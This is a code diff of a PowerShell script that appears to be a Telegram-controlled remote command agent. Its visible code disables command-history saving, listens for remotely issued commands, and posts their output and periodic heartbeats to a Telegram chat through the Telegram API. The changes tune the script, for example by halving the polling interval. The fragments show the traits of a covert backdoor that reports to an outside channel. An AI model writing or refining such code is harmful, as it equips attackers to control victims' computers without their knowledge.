@@ -3,7 +3,7 @@
 
 Clear-Host  # Clear the shell
 Set-PSReadlineOption    -HistorySaveStyle   SaveNothing             # Do not save commands run in this powershell session
-Set-Location            -Path               $env:USERPROFILE        # Set the user profile location as default location
+Set-Location            -Path               $env:USERPROFILE        # Set location to the user's folder
 Add-Type                -AssemblyName       System.Windows.Forms    # Adds a Microsoft .NET class to a PowerShell session
 Add-type                -AssemblyName       System.Drawing          # Adds a Microsoft .NET class to a PowerShell session
 
@@ -39,8 +39,6 @@ function saveLocalLogs ($loglevel, $string)
         } catch {
             Write-Host "log" -BackgroundColor Black -ForegroundColor Red $Error[0]
         }
-
-        Start-Sleep -Milliseconds 10
     }
 }
 
@@ -146,7 +144,7 @@ function sendMessage ($output, $message_id)
 # Finally try to send the message by making an HTTPS call to the Telegram API.
 {
     saveLocalLogs "log" "Preparing for sending the output..."
-    
+
     $MessageToSend = New-Object psobject
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $tID
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
@@ -158,7 +156,7 @@ function sendMessage ($output, $message_id)
 
     try {
         saveLocalLogs "log" "Send via API the message containing the output..."
-        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json" | Out-Null   # Send an HTTPS POST request
+        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" | Out-Null   # Send an HTTPS POST request
         saveLocalLogs "log" "The message has been successfully sent"
     } catch {
         saveLocalLogs "err" $Error[0]
@@ -230,8 +228,8 @@ function commandListener
                             }
                         }
 
-                        saveLocalLogs "log" "Set the timer to 1000ms"
-                        $wait = 1000
+                        saveLocalLogs "log" "Set the timer to 500ms"
+                        $wait = 500
                     }
                     
                     if ($document) {
@@ -254,7 +252,7 @@ function commandListener
             if ($wait -eq 15000) {
                 saveLocalLogs "log" "The timer has reached the maximum of its default value, I reset it to 1000ms..."
                 sendMessage "[heartbeat]"
-                $wait = 1000
+                $wait = 500
             } else {
                 $wait = $wait + 100
             }
@@ -268,7 +266,6 @@ function commandListener
         }
     }
 }
-
 
 
 saveLocalLogs "log" "Checking the cache file..."
